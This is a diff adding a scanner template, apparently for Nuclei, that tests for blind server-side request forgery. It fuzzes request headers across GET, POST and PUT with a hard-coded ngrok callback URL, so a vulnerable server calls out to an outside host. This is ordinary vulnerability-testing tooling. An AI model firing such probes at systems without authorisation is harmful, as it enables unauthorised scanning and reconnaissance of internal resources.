@@ -1,0 +1,34 @@
+id: Blind-SSRF
+
+info:
+  name: Blind_ssrf
+  author: MR.iambatman
+  severity: high
+  description: ssrf
+
+requests:
+
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        §header§: https://9a7d-183-82-25-4.ngrok.io
+         
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        §header§: https://9a7d-183-82-25-4.ngrok.io
+
+      - |  
+        PUT / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+        §header§: https://9a7d-183-82-25-4.ngrok.io
+
+    payloads:
+      header: helpers/payloads/request-headers.txt
+    attack: clusterbomb
+    redirects: true
+
